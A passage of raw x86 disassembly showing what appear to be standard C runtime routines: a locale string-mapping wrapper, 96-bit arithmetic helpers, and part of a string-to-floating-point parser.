  415af6:	83 c9 ff             	or     $0xffffffff,%ecx
  415af9:	83 c8 ff             	or     $0xffffffff,%eax
  415afc:	2b c1                	sub    %ecx,%eax
  415afe:	01 45 14             	add    %eax,0x14(%ebp)
  415b01:	a1 68 6f 45 00       	mov    0x456f68,%eax
  415b06:	83 f8 02             	cmp    $0x2,%eax
  415b09:	0f 84 dc 01 00 00    	je     0x415ceb
  415b0f:	3b c3                	cmp    %ebx,%eax
  415b11:	0f 84 d4 01 00 00    	je     0x415ceb
  415b17:	83 f8 01             	cmp    $0x1,%eax
  415b1a:	0f 85 fe 01 00 00    	jne    0x415d1e
  415b20:	33 ff                	xor    %edi,%edi
  415b22:	89 7d e4             	mov    %edi,-0x1c(%ebp)
  415b25:	89 5d e0             	mov    %ebx,-0x20(%ebp)
  415b28:	89 5d dc             	mov    %ebx,-0x24(%ebp)
  415b2b:	39 5d 20             	cmp    %ebx,0x20(%ebp)
  415b2e:	75 08                	jne    0x415b38
  415b30:	a1 9c 6f 45 00       	mov    0x456f9c,%eax
  415b35:	89 45 20             	mov    %eax,0x20(%ebp)
  415b38:	53                   	push   %ebx
  415b39:	53                   	push   %ebx
  415b3a:	ff 75 14             	push   0x14(%ebp)
  415b3d:	ff 75 10             	push   0x10(%ebp)
  415b40:	33 c0                	xor    %eax,%eax
  415b42:	39 5d 24             	cmp    %ebx,0x24(%ebp)
  415b45:	0f 95 c0             	setne  %al
  415b48:	8d 04 c5 01 00 00 00 	lea    0x1(,%eax,8),%eax
  415b4f:	50                   	push   %eax
  415b50:	ff 75 20             	push   0x20(%ebp)
  415b53:	ff 15 74 80 41 00    	call   *0x418074
  415b59:	8b f0                	mov    %eax,%esi
  415b5b:	89 75 d8             	mov    %esi,-0x28(%ebp)
  415b5e:	3b f3                	cmp    %ebx,%esi
  415b60:	0f 84 b8 01 00 00    	je     0x415d1e
  415b66:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  415b6d:	8d 04 36             	lea    (%esi,%esi,1),%eax
  415b70:	83 c0 03             	add    $0x3,%eax
  415b73:	83 e0 fc             	and    $0xfffffffc,%eax
  415b76:	e8 e5 d4 ff ff       	call   0x413060
  415b7b:	89 65 e8             	mov    %esp,-0x18(%ebp)
  415b7e:	8b c4                	mov    %esp,%eax
  415b80:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  415b83:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  415b87:	eb 1b                	jmp    0x415ba4
  415b89:	33 c0                	xor    %eax,%eax
  415b8b:	40                   	inc    %eax
  415b8c:	c3                   	ret
  415b8d:	8b 65 e8             	mov    -0x18(%ebp),%esp
  415b90:	e8 c1 18 00 00       	call   0x417456
  415b95:	33 db                	xor    %ebx,%ebx
  415b97:	89 5d d4             	mov    %ebx,-0x2c(%ebp)
  415b9a:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  415b9e:	8b 7d e4             	mov    -0x1c(%ebp),%edi
  415ba1:	8b 75 d8             	mov    -0x28(%ebp),%esi
  415ba4:	39 5d d4             	cmp    %ebx,-0x2c(%ebp)
  415ba7:	75 1c                	jne    0x415bc5
  415ba9:	8d 04 36             	lea    (%esi,%esi,1),%eax
  415bac:	50                   	push   %eax
  415bad:	e8 30 c7 ff ff       	call   0x4122e2
  415bb2:	59                   	pop    %ecx
  415bb3:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  415bb6:	3b c3                	cmp    %ebx,%eax
  415bb8:	0f 84 60 01 00 00    	je     0x415d1e
  415bbe:	c7 45 e0 01 00 00 00 	movl   $0x1,-0x20(%ebp)
  415bc5:	56                   	push   %esi
  415bc6:	ff 75 d4             	push   -0x2c(%ebp)
  415bc9:	ff 75 14             	push   0x14(%ebp)
  415bcc:	ff 75 10             	push   0x10(%ebp)
  415bcf:	6a 01                	push   $0x1
  415bd1:	ff 75 20             	push   0x20(%ebp)
  415bd4:	ff 15 74 80 41 00    	call   *0x418074
  415bda:	85 c0                	test   %eax,%eax
  415bdc:	0f 84 e6 00 00 00    	je     0x415cc8
  415be2:	53                   	push   %ebx
  415be3:	53                   	push   %ebx
  415be4:	56                   	push   %esi
  415be5:	ff 75 d4             	push   -0x2c(%ebp)
  415be8:	ff 75 0c             	push   0xc(%ebp)
  415beb:	ff 75 08             	push   0x8(%ebp)
  415bee:	ff 15 70 80 41 00    	call   *0x418070
  415bf4:	8b f8                	mov    %eax,%edi
  415bf6:	89 7d e4             	mov    %edi,-0x1c(%ebp)
  415bf9:	3b fb                	cmp    %ebx,%edi
  415bfb:	0f 84 c7 00 00 00    	je     0x415cc8
  415c01:	f6 45 0d 04          	testb  $0x4,0xd(%ebp)
  415c05:	74 2d                	je     0x415c34
  415c07:	39 5d 1c             	cmp    %ebx,0x1c(%ebp)
  415c0a:	0f 84 b8 00 00 00    	je     0x415cc8
  415c10:	3b 7d 1c             	cmp    0x1c(%ebp),%edi
  415c13:	0f 8f af 00 00 00    	jg     0x415cc8
  415c19:	ff 75 1c             	push   0x1c(%ebp)
  415c1c:	ff 75 18             	push   0x18(%ebp)
  415c1f:	56                   	push   %esi
  415c20:	ff 75 d4             	push   -0x2c(%ebp)
  415c23:	ff 75 0c             	push   0xc(%ebp)
  415c26:	ff 75 08             	push   0x8(%ebp)
  415c29:	ff 15 70 80 41 00    	call   *0x418070
  415c2f:	e9 94 00 00 00       	jmp    0x415cc8
  415c34:	c7 45 fc 02 00 00 00 	movl   $0x2,-0x4(%ebp)
  415c3b:	8d 04 3f             	lea    (%edi,%edi,1),%eax
  415c3e:	83 c0 03             	add    $0x3,%eax
  415c41:	83 e0 fc             	and    $0xfffffffc,%eax
  415c44:	e8 17 d4 ff ff       	call   0x413060
  415c49:	89 65 e8             	mov    %esp,-0x18(%ebp)
  415c4c:	8b c4                	mov    %esp,%eax
  415c4e:	89 45 d0             	mov    %eax,-0x30(%ebp)
  415c51:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  415c55:	eb 1b                	jmp    0x415c72
  415c57:	33 c0                	xor    %eax,%eax
  415c59:	40                   	inc    %eax
  415c5a:	c3                   	ret
  415c5b:	8b 65 e8             	mov    -0x18(%ebp),%esp
  415c5e:	e8 f3 17 00 00       	call   0x417456
  415c63:	33 db                	xor    %ebx,%ebx
  415c65:	89 5d d0             	mov    %ebx,-0x30(%ebp)
  415c68:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  415c6c:	8b 7d e4             	mov    -0x1c(%ebp),%edi
  415c6f:	8b 75 d8             	mov    -0x28(%ebp),%esi
  415c72:	39 5d d0             	cmp    %ebx,-0x30(%ebp)
  415c75:	75 18                	jne    0x415c8f
  415c77:	8d 04 3f             	lea    (%edi,%edi,1),%eax
  415c7a:	50                   	push   %eax
  415c7b:	e8 62 c6 ff ff       	call   0x4122e2
  415c80:	59                   	pop    %ecx
  415c81:	89 45 d0             	mov    %eax,-0x30(%ebp)
  415c84:	3b c3                	cmp    %ebx,%eax
  415c86:	74 40                	je     0x415cc8
  415c88:	c7 45 dc 01 00 00 00 	movl   $0x1,-0x24(%ebp)
  415c8f:	57                   	push   %edi
  415c90:	ff 75 d0             	push   -0x30(%ebp)
  415c93:	56                   	push   %esi
  415c94:	ff 75 d4             	push   -0x2c(%ebp)
  415c97:	ff 75 0c             	push   0xc(%ebp)
  415c9a:	ff 75 08             	push   0x8(%ebp)
  415c9d:	ff 15 70 80 41 00    	call   *0x418070
  415ca3:	85 c0                	test   %eax,%eax
  415ca5:	74 21                	je     0x415cc8
  415ca7:	53                   	push   %ebx
  415ca8:	53                   	push   %ebx
  415ca9:	39 5d 1c             	cmp    %ebx,0x1c(%ebp)
  415cac:	75 04                	jne    0x415cb2
  415cae:	53                   	push   %ebx
  415caf:	53                   	push   %ebx
  415cb0:	eb 06                	jmp    0x415cb8
  415cb2:	ff 75 1c             	push   0x1c(%ebp)
  415cb5:	ff 75 18             	push   0x18(%ebp)
  415cb8:	57                   	push   %edi
  415cb9:	ff 75 d0             	push   -0x30(%ebp)
  415cbc:	53                   	push   %ebx
  415cbd:	ff 75 20             	push   0x20(%ebp)
  415cc0:	ff 15 b4 80 41 00    	call   *0x4180b4
  415cc6:	8b f8                	mov    %eax,%edi
  415cc8:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  415ccb:	74 09                	je     0x415cd6
  415ccd:	ff 75 d0             	push   -0x30(%ebp)
  415cd0:	e8 f5 c4 ff ff       	call   0x4121ca
  415cd5:	59                   	pop    %ecx
  415cd6:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  415cd9:	74 09                	je     0x415ce4
  415cdb:	ff 75 d4             	push   -0x2c(%ebp)
  415cde:	e8 e7 c4 ff ff       	call   0x4121ca
  415ce3:	59                   	pop    %ecx
  415ce4:	8b c7                	mov    %edi,%eax
  415ce6:	e9 5b 01 00 00       	jmp    0x415e46
  415ceb:	89 5d cc             	mov    %ebx,-0x34(%ebp)
  415cee:	33 ff                	xor    %edi,%edi
  415cf0:	89 5d c8             	mov    %ebx,-0x38(%ebp)
  415cf3:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  415cf6:	75 08                	jne    0x415d00
  415cf8:	a1 8c 6f 45 00       	mov    0x456f8c,%eax
  415cfd:	89 45 08             	mov    %eax,0x8(%ebp)
  415d00:	39 5d 20             	cmp    %ebx,0x20(%ebp)
  415d03:	75 08                	jne    0x415d0d
  415d05:	a1 9c 6f 45 00       	mov    0x456f9c,%eax
  415d0a:	89 45 20             	mov    %eax,0x20(%ebp)
  415d0d:	ff 75 08             	push   0x8(%ebp)
  415d10:	e8 29 15 00 00       	call   0x41723e
  415d15:	59                   	pop    %ecx
  415d16:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  415d19:	83 f8 ff             	cmp    $0xffffffff,%eax
  415d1c:	75 07                	jne    0x415d25
  415d1e:	33 c0                	xor    %eax,%eax
  415d20:	e9 21 01 00 00       	jmp    0x415e46
  415d25:	3b 45 20             	cmp    0x20(%ebp),%eax
  415d28:	0f 84 ee 00 00 00    	je     0x415e1c
  415d2e:	53                   	push   %ebx
  415d2f:	53                   	push   %ebx
  415d30:	8d 4d 14             	lea    0x14(%ebp),%ecx
  415d33:	51                   	push   %ecx
  415d34:	ff 75 10             	push   0x10(%ebp)
  415d37:	50                   	push   %eax
  415d38:	ff 75 20             	push   0x20(%ebp)
  415d3b:	e8 47 15 00 00       	call   0x417287
  415d40:	83 c4 18             	add    $0x18,%esp
  415d43:	89 45 cc             	mov    %eax,-0x34(%ebp)
  415d46:	3b c3                	cmp    %ebx,%eax
  415d48:	74 d4                	je     0x415d1e
  415d4a:	53                   	push   %ebx
  415d4b:	53                   	push   %ebx
  415d4c:	ff 75 14             	push   0x14(%ebp)
  415d4f:	50                   	push   %eax
  415d50:	ff 75 0c             	push   0xc(%ebp)
  415d53:	ff 75 08             	push   0x8(%ebp)
  415d56:	ff 15 78 80 41 00    	call   *0x418078
  415d5c:	8b f0                	mov    %eax,%esi
  415d5e:	89 75 c0             	mov    %esi,-0x40(%ebp)
  415d61:	3b f3                	cmp    %ebx,%esi
  415d63:	0f 84 a2 00 00 00    	je     0x415e0b
  415d69:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  415d6c:	83 c0 03             	add    $0x3,%eax
  415d6f:	83 e0 fc             	and    $0xfffffffc,%eax
  415d72:	e8 e9 d2 ff ff       	call   0x413060
  415d77:	89 65 e8             	mov    %esp,-0x18(%ebp)
  415d7a:	8b fc                	mov    %esp,%edi
  415d7c:	89 7d bc             	mov    %edi,-0x44(%ebp)
  415d7f:	56                   	push   %esi
  415d80:	53                   	push   %ebx
  415d81:	57                   	push   %edi
  415d82:	e8 99 de ff ff       	call   0x413c20
  415d87:	83 c4 0c             	add    $0xc,%esp
  415d8a:	eb 10                	jmp    0x415d9c
  415d8c:	33 c0                	xor    %eax,%eax
  415d8e:	40                   	inc    %eax
  415d8f:	c3                   	ret
  415d90:	8b 65 e8             	mov    -0x18(%ebp),%esp
  415d93:	e8 be 16 00 00       	call   0x417456
  415d98:	33 db                	xor    %ebx,%ebx
  415d9a:	33 ff                	xor    %edi,%edi
  415d9c:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  415da0:	3b fb                	cmp    %ebx,%edi
  415da2:	75 23                	jne    0x415dc7
  415da4:	ff 75 c0             	push   -0x40(%ebp)
  415da7:	e8 36 c5 ff ff       	call   0x4122e2
  415dac:	59                   	pop    %ecx
  415dad:	8b f8                	mov    %eax,%edi
  415daf:	3b fb                	cmp    %ebx,%edi
  415db1:	74 31                	je     0x415de4
  415db3:	ff 75 c0             	push   -0x40(%ebp)
  415db6:	53                   	push   %ebx
  415db7:	57                   	push   %edi
  415db8:	e8 63 de ff ff       	call   0x413c20
  415dbd:	83 c4 0c             	add    $0xc,%esp
  415dc0:	c7 45 c8 01 00 00 00 	movl   $0x1,-0x38(%ebp)
  415dc7:	ff 75 c0             	push   -0x40(%ebp)
  415dca:	57                   	push   %edi
  415dcb:	ff 75 14             	push   0x14(%ebp)
  415dce:	ff 75 cc             	push   -0x34(%ebp)
  415dd1:	ff 75 0c             	push   0xc(%ebp)
  415dd4:	ff 75 08             	push   0x8(%ebp)
  415dd7:	ff 15 78 80 41 00    	call   *0x418078
  415ddd:	89 45 c0             	mov    %eax,-0x40(%ebp)
  415de0:	3b c3                	cmp    %ebx,%eax
  415de2:	75 04                	jne    0x415de8
  415de4:	33 f6                	xor    %esi,%esi
  415de6:	eb 26                	jmp    0x415e0e
  415de8:	ff 75 1c             	push   0x1c(%ebp)
  415deb:	ff 75 18             	push   0x18(%ebp)
  415dee:	8d 45 c0             	lea    -0x40(%ebp),%eax
  415df1:	50                   	push   %eax
  415df2:	57                   	push   %edi
  415df3:	ff 75 20             	push   0x20(%ebp)
  415df6:	ff 75 c4             	push   -0x3c(%ebp)
  415df9:	e8 89 14 00 00       	call   0x417287
  415dfe:	83 c4 18             	add    $0x18,%esp
  415e01:	8b f0                	mov    %eax,%esi
  415e03:	f7 de                	neg    %esi
  415e05:	1b f6                	sbb    %esi,%esi
  415e07:	f7 de                	neg    %esi
  415e09:	eb 03                	jmp    0x415e0e
  415e0b:	8b 75 b8             	mov    -0x48(%ebp),%esi
  415e0e:	39 5d c8             	cmp    %ebx,-0x38(%ebp)
  415e11:	74 23                	je     0x415e36
  415e13:	57                   	push   %edi
  415e14:	e8 b1 c3 ff ff       	call   0x4121ca
  415e19:	59                   	pop    %ecx
  415e1a:	eb 1a                	jmp    0x415e36
  415e1c:	ff 75 1c             	push   0x1c(%ebp)
  415e1f:	ff 75 18             	push   0x18(%ebp)
  415e22:	ff 75 14             	push   0x14(%ebp)
  415e25:	ff 75 10             	push   0x10(%ebp)
  415e28:	ff 75 0c             	push   0xc(%ebp)
  415e2b:	ff 75 08             	push   0x8(%ebp)
  415e2e:	ff 15 78 80 41 00    	call   *0x418078
  415e34:	8b f0                	mov    %eax,%esi
  415e36:	39 5d cc             	cmp    %ebx,-0x34(%ebp)
  415e39:	74 09                	je     0x415e44
  415e3b:	ff 75 cc             	push   -0x34(%ebp)
  415e3e:	e8 87 c3 ff ff       	call   0x4121ca
  415e43:	59                   	pop    %ecx
  415e44:	8b c6                	mov    %esi,%eax
  415e46:	8d 65 ac             	lea    -0x54(%ebp),%esp
  415e49:	e8 01 d2 ff ff       	call   0x41304f
  415e4e:	c3                   	ret
  415e4f:	8b 54 24 04          	mov    0x4(%esp),%edx
  415e53:	56                   	push   %esi
  415e54:	8b 74 24 0c          	mov    0xc(%esp),%esi
  415e58:	8d 0c 32             	lea    (%edx,%esi,1),%ecx
  415e5b:	33 c0                	xor    %eax,%eax
  415e5d:	3b ca                	cmp    %edx,%ecx
  415e5f:	72 04                	jb     0x415e65
  415e61:	3b ce                	cmp    %esi,%ecx
  415e63:	73 03                	jae    0x415e68
  415e65:	33 c0                	xor    %eax,%eax
  415e67:	40                   	inc    %eax
  415e68:	8b 54 24 10          	mov    0x10(%esp),%edx
  415e6c:	89 0a                	mov    %ecx,(%edx)
  415e6e:	5e                   	pop    %esi
  415e6f:	c3                   	ret
  415e70:	56                   	push   %esi
  415e71:	8b 74 24 08          	mov    0x8(%esp),%esi
  415e75:	57                   	push   %edi
  415e76:	8b 7c 24 10          	mov    0x10(%esp),%edi
  415e7a:	56                   	push   %esi
  415e7b:	ff 37                	push   (%edi)
  415e7d:	ff 36                	push   (%esi)
  415e7f:	e8 cb ff ff ff       	call   0x415e4f
  415e84:	83 c4 0c             	add    $0xc,%esp
  415e87:	85 c0                	test   %eax,%eax
  415e89:	74 17                	je     0x415ea2
  415e8b:	8d 46 04             	lea    0x4(%esi),%eax
  415e8e:	50                   	push   %eax
  415e8f:	6a 01                	push   $0x1
  415e91:	ff 30                	push   (%eax)
  415e93:	e8 b7 ff ff ff       	call   0x415e4f
  415e98:	83 c4 0c             	add    $0xc,%esp
  415e9b:	85 c0                	test   %eax,%eax
  415e9d:	74 03                	je     0x415ea2
  415e9f:	ff 46 08             	incl   0x8(%esi)
  415ea2:	8d 46 04             	lea    0x4(%esi),%eax
  415ea5:	50                   	push   %eax
  415ea6:	ff 77 04             	push   0x4(%edi)
  415ea9:	ff 30                	push   (%eax)
  415eab:	e8 9f ff ff ff       	call   0x415e4f
  415eb0:	83 c4 0c             	add    $0xc,%esp
  415eb3:	85 c0                	test   %eax,%eax
  415eb5:	74 03                	je     0x415eba
  415eb7:	ff 46 08             	incl   0x8(%esi)
  415eba:	8d 46 08             	lea    0x8(%esi),%eax
  415ebd:	50                   	push   %eax
  415ebe:	ff 77 08             	push   0x8(%edi)
  415ec1:	ff 30                	push   (%eax)
  415ec3:	e8 87 ff ff ff       	call   0x415e4f
  415ec8:	83 c4 0c             	add    $0xc,%esp
  415ecb:	5f                   	pop    %edi
  415ecc:	5e                   	pop    %esi
  415ecd:	c3                   	ret
  415ece:	8b 44 24 04          	mov    0x4(%esp),%eax
  415ed2:	56                   	push   %esi
  415ed3:	8b 30                	mov    (%eax),%esi
  415ed5:	8b ce                	mov    %esi,%ecx
  415ed7:	03 f6                	add    %esi,%esi
  415ed9:	57                   	push   %edi
  415eda:	8b 78 04             	mov    0x4(%eax),%edi
  415edd:	c1 e9 1f             	shr    $0x1f,%ecx
  415ee0:	89 30                	mov    %esi,(%eax)
  415ee2:	8d 34 3f             	lea    (%edi,%edi,1),%esi
  415ee5:	0b f1                	or     %ecx,%esi
  415ee7:	8b 48 08             	mov    0x8(%eax),%ecx
  415eea:	8b d7                	mov    %edi,%edx
  415eec:	c1 ea 1f             	shr    $0x1f,%edx
  415eef:	d1 e1                	shl    %ecx
  415ef1:	0b ca                	or     %edx,%ecx
  415ef3:	5f                   	pop    %edi
  415ef4:	89 70 04             	mov    %esi,0x4(%eax)
  415ef7:	89 48 08             	mov    %ecx,0x8(%eax)
  415efa:	5e                   	pop    %esi
  415efb:	c3                   	ret
  415efc:	8b 44 24 04          	mov    0x4(%esp),%eax
  415f00:	8b 50 08             	mov    0x8(%eax),%edx
  415f03:	8b 48 04             	mov    0x4(%eax),%ecx
  415f06:	56                   	push   %esi
  415f07:	57                   	push   %edi
  415f08:	8b f9                	mov    %ecx,%edi
  415f0a:	8b f2                	mov    %edx,%esi
  415f0c:	d1 e9                	shr    %ecx
  415f0e:	c1 e6 1f             	shl    $0x1f,%esi
  415f11:	0b ce                	or     %esi,%ecx
  415f13:	89 48 04             	mov    %ecx,0x4(%eax)
  415f16:	8b 08                	mov    (%eax),%ecx
  415f18:	c1 e7 1f             	shl    $0x1f,%edi
  415f1b:	d1 e9                	shr    %ecx
  415f1d:	0b cf                	or     %edi,%ecx
  415f1f:	d1 ea                	shr    %edx
  415f21:	5f                   	pop    %edi
  415f22:	89 50 08             	mov    %edx,0x8(%eax)
  415f25:	89 08                	mov    %ecx,(%eax)
  415f27:	5e                   	pop    %esi
  415f28:	c3                   	ret
  415f29:	55                   	push   %ebp
  415f2a:	8b ec                	mov    %esp,%ebp
  415f2c:	83 ec 14             	sub    $0x14,%esp
  415f2f:	a1 10 62 45 00       	mov    0x456210,%eax
  415f34:	33 45 04             	xor    0x4(%ebp),%eax
  415f37:	53                   	push   %ebx
  415f38:	8b 5d 10             	mov    0x10(%ebp),%ebx
  415f3b:	33 d2                	xor    %edx,%edx
  415f3d:	89 45 fc             	mov    %eax,-0x4(%ebp)
  415f40:	8b 45 0c             	mov    0xc(%ebp),%eax
  415f43:	3b c2                	cmp    %edx,%eax
  415f45:	56                   	push   %esi
  415f46:	57                   	push   %edi
  415f47:	c7 45 f8 4e 40 00 00 	movl   $0x404e,-0x8(%ebp)
  415f4e:	89 13                	mov    %edx,(%ebx)
  415f50:	89 53 04             	mov    %edx,0x4(%ebx)
  415f53:	89 53 08             	mov    %edx,0x8(%ebx)
  415f56:	76 4f                	jbe    0x415fa7
  415f58:	89 45 10             	mov    %eax,0x10(%ebp)
  415f5b:	8b f3                	mov    %ebx,%esi
  415f5d:	8d 7d ec             	lea    -0x14(%ebp),%edi
  415f60:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  415f61:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  415f62:	53                   	push   %ebx
  415f63:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  415f64:	e8 65 ff ff ff       	call   0x415ece
  415f69:	53                   	push   %ebx
  415f6a:	e8 5f ff ff ff       	call   0x415ece
  415f6f:	8d 45 ec             	lea    -0x14(%ebp),%eax
  415f72:	50                   	push   %eax
  415f73:	53                   	push   %ebx
  415f74:	e8 f7 fe ff ff       	call   0x415e70
  415f79:	53                   	push   %ebx
  415f7a:	e8 4f ff ff ff       	call   0x415ece
  415f7f:	8b 45 08             	mov    0x8(%ebp),%eax
  415f82:	0f be 00             	movsbl (%eax),%eax
  415f85:	83 65 f0 00          	andl   $0x0,-0x10(%ebp)
  415f89:	83 65 f4 00          	andl   $0x0,-0xc(%ebp)
  415f8d:	89 45 ec             	mov    %eax,-0x14(%ebp)
  415f90:	8d 45 ec             	lea    -0x14(%ebp),%eax
  415f93:	50                   	push   %eax
  415f94:	53                   	push   %ebx
  415f95:	e8 d6 fe ff ff       	call   0x415e70
  415f9a:	83 c4 1c             	add    $0x1c,%esp
  415f9d:	ff 45 08             	incl   0x8(%ebp)
  415fa0:	ff 4d 10             	decl   0x10(%ebp)
  415fa3:	75 b6                	jne    0x415f5b
  415fa5:	33 d2                	xor    %edx,%edx
  415fa7:	39 53 08             	cmp    %edx,0x8(%ebx)
  415faa:	75 2f                	jne    0x415fdb
  415fac:	8b 7b 08             	mov    0x8(%ebx),%edi
  415faf:	8b 4b 04             	mov    0x4(%ebx),%ecx
  415fb2:	81 45 f8 f0 ff 00 00 	addl   $0xfff0,-0x8(%ebp)
  415fb9:	8b c1                	mov    %ecx,%eax
  415fbb:	c1 e8 10             	shr    $0x10,%eax
  415fbe:	8b f8                	mov    %eax,%edi
  415fc0:	8b 03                	mov    (%ebx),%eax
  415fc2:	8b f0                	mov    %eax,%esi
  415fc4:	c1 ee 10             	shr    $0x10,%esi
  415fc7:	c1 e1 10             	shl    $0x10,%ecx
  415fca:	0b f1                	or     %ecx,%esi
  415fcc:	c1 e0 10             	shl    $0x10,%eax
  415fcf:	3b fa                	cmp    %edx,%edi
  415fd1:	89 73 04             	mov    %esi,0x4(%ebx)
  415fd4:	89 03                	mov    %eax,(%ebx)
  415fd6:	74 d7                	je     0x415faf
  415fd8:	89 7b 08             	mov    %edi,0x8(%ebx)
  415fdb:	be 00 80 00 00       	mov    $0x8000,%esi
  415fe0:	eb 0e                	jmp    0x415ff0
  415fe2:	53                   	push   %ebx
  415fe3:	e8 e6 fe ff ff       	call   0x415ece
  415fe8:	81 45 f8 ff ff 00 00 	addl   $0xffff,-0x8(%ebp)
  415fef:	59                   	pop    %ecx
  415ff0:	85 73 08             	test   %esi,0x8(%ebx)
  415ff3:	74 ed                	je     0x415fe2
  415ff5:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  415ff8:	66 8b 45 f8          	mov    -0x8(%ebp),%ax
  415ffc:	33 4d 04             	xor    0x4(%ebp),%ecx
  415fff:	5f                   	pop    %edi
  416000:	5e                   	pop    %esi
  416001:	66 89 43 0a          	mov    %ax,0xa(%ebx)
  416005:	5b                   	pop    %ebx
  416006:	e8 01 dc ff ff       	call   0x413c0c
  41600b:	c9                   	leave
  41600c:	c3                   	ret
  41600d:	55                   	push   %ebp
  41600e:	8b ec                	mov    %esp,%ebp
  416010:	83 ec 58             	sub    $0x58,%esp
  416013:	a1 10 62 45 00       	mov    0x456210,%eax
  416018:	33 45 04             	xor    0x4(%ebp),%eax
  41601b:	53                   	push   %ebx
  41601c:	56                   	push   %esi
  41601d:	89 45 fc             	mov    %eax,-0x4(%ebp)
  416020:	33 c0                	xor    %eax,%eax
  416022:	57                   	push   %edi
  416023:	8b 7d 10             	mov    0x10(%ebp),%edi
  416026:	8d 75 a8             	lea    -0x58(%ebp),%esi
  416029:	89 75 f8             	mov    %esi,-0x8(%ebp)
  41602c:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  41602f:	c7 45 e4 01 00 00 00 	movl   $0x1,-0x1c(%ebp)
  416036:	89 45 f4             	mov    %eax,-0xc(%ebp)
  416039:	89 45 ec             	mov    %eax,-0x14(%ebp)
  41603c:	89 45 d8             	mov    %eax,-0x28(%ebp)
  41603f:	89 45 dc             	mov    %eax,-0x24(%ebp)
  416042:	89 45 e0             	mov    %eax,-0x20(%ebp)
  416045:	89 45 f0             	mov    %eax,-0x10(%ebp)
  416048:	89 45 e8             	mov    %eax,-0x18(%ebp)
  41604b:	89 7d 10             	mov    %edi,0x10(%ebp)
  41604e:	8a 0f                	mov    (%edi),%cl
  416050:	80 f9 20             	cmp    $0x20,%cl
  416053:	74 0f                	je     0x416064
  416055:	80 f9 09             	cmp    $0x9,%cl
  416058:	74 0a                	je     0x416064
  41605a:	80 f9 0a             	cmp    $0xa,%cl
  41605d:	74 05                	je     0x416064
  41605f:	80 f9 0d             	cmp    $0xd,%cl
  416062:	75 03                	jne    0x416067
  416064:	47                   	inc    %edi
  416065:	eb e7                	jmp    0x41604e
  416067:	8a 1f                	mov    (%edi),%bl
  416069:	47                   	inc    %edi
  41606a:	83 f8 0b             	cmp    $0xb,%eax
  41606d:	0f 87 73 02 00 00    	ja     0x4162e6
  416073:	ff 24 85 17 64 41 00 	jmp    *0x416417(,%eax,4)
  41607a:	80 fb 31             	cmp    $0x31,%bl
  41607d:	7c 0c                	jl     0x41608b
  41607f:	80 fb 39             	cmp    $0x39,%bl
  416082:	7f 07                	jg     0x41608b
  416084:	6a 03                	push   $0x3
  416086:	e9 1a 02 00 00       	jmp    0x4162a5
  41608b:	3a 1d d4 61 45 00    	cmp    0x4561d4,%bl
  416091:	75 07                	jne    0x41609a
  416093:	6a 05                	push   $0x5
  416095:	e9 42 02 00 00       	jmp    0x4162dc
  41609a:	0f be c3             	movsbl %bl,%eax
  41609d:	83 e8 2b             	sub    $0x2b,%eax
  4160a0:	74 22                	je     0x4160c4
  4160a2:	48                   	dec    %eax
  4160a3:	48                   	dec    %eax
  4160a4:	74 12                	je     0x4160b8
  4160a6:	83 e8 03             	sub    $0x3,%eax
  4160a9:	0f 84 a2 00 00 00    	je     0x416151
  4160af:	89 75 f8             	mov    %esi,-0x8(%ebp)
  4160b2:	4f                   	dec    %edi
  4160b3:	e9 ab 01 00 00       	jmp    0x416263
  4160b8:	6a 02                	push   $0x2
  4160ba:	58                   	pop    %eax
  4160bb:	c7 45 d4 00 80 00 00 	movl   $0x8000,-0x2c(%ebp)
  4160c2:	eb a3                	jmp    0x416067
  4160c4:	83 65 d4 00          	andl   $0x0,-0x2c(%ebp)
  4160c8:	6a 02                	push   $0x2
  4160ca:	58                   	pop    %eax
  4160cb:	eb 9a                	jmp    0x416067
  4160cd:	33 c0                	xor    %eax,%eax
  4160cf:	40                   	inc    %eax
  4160d0:	80 fb 31             	cmp    $0x31,%bl
  4160d3:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4160d6:	7c 05                	jl     0x4160dd
  4160d8:	80 fb 39             	cmp    $0x39,%bl
  4160db:	7e a7                	jle    0x416084
  4160dd:	3a 1d d4 61 45 00    	cmp    0x4561d4,%bl
  4160e3:	75 07                	jne    0x4160ec
  4160e5:	6a 04                	push   $0x4
  4160e7:	e9 f0 01 00 00       	jmp    0x4162dc
  4160ec:	80 fb 2b             	cmp    $0x2b,%bl
  4160ef:	74 35                	je     0x416126
  4160f1:	80 fb 2d             	cmp    $0x2d,%bl
  4160f4:	74 30                	je     0x416126
  4160f6:	80 fb 30             	cmp    $0x30,%bl
  4160f9:	0f 84 68 ff ff ff    	je     0x416067
  4160ff:	80 fb 43             	cmp    $0x43,%bl
  416102:	0f 8e 57 01 00 00    	jle    0x41625f
  416108:	80 fb 45             	cmp    $0x45,%bl
  41610b:	7e 12                	jle    0x41611f
  41610d:	80 fb 63             	cmp    $0x63,%bl
  416110:	0f 8e 49 01 00 00    	jle    0x41625f
  416116:	80 fb 65             	cmp    $0x65,%bl
  416119:	0f 8f 40 01 00 00    	jg     0x41625f
  41611f:	6a 06                	push   $0x6
  416121:	e9 b6 01 00 00       	jmp    0x4162dc
  416126:	4f                   	dec    %edi
  416127:	6a 0b                	push   $0xb
  416129:	e9 ae 01 00 00       	jmp    0x4162dc
  41612e:	80 fb 31             	cmp    $0x31,%bl
  416131:	7c 09                	jl     0x41613c
  416133:	80 fb 39             	cmp    $0x39,%bl
  416136:	0f 8e 48 ff ff ff    	jle    0x416084
  41613c:	3a 1d d4 61 45 00    	cmp    0x4561d4,%bl
  416142:	0f 84 4b ff ff ff    	je     0x416093
  416148:	80 fb 30             	cmp    $0x30,%bl
